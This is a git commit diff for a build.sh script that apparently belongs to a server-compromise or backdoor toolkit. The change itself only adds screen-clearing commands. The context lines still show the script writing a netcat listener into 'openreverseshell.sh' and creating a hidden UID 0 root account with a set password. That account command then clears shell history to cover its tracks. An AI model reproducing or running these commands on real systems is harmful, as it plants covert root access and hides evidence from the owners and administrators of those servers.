86c9daed8e7308eede620a362d6de0e1d4e77d9f
PrestigeDox <themutantreaper@gmail.com>
2017-08-12 10:59:02 +0100

    update build.sh
    Just adding clear command in areas to speed/clear the screen and processes.

--- build.sh
+++ build.sh
@@ -1,8 +1,11 @@
 #Build:
 #USAGE - sh build.sh <ROOTING USER> <ROOTING PASS> <SERVER IP>
+clear
 cd /root
+clear
 
 yum install gcc -y; yum install nano -y;
+clear
 
 gcc main.c -o main
 rm -rf main.c
@@ -31,3 +34,5 @@ echo 'screen -d -m bash -c "nc -l 1006"' >> openreverseshell.sh
 #Activae it from main.c - this would be used to keep a seoncd login to your server incase someone jacked it
 #And you didnt have cpan access to reset the server root password. 
 echo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash $1; echo -e $2"\n"$2 | passwd $1; history -c; >> root.sh
+
+clear
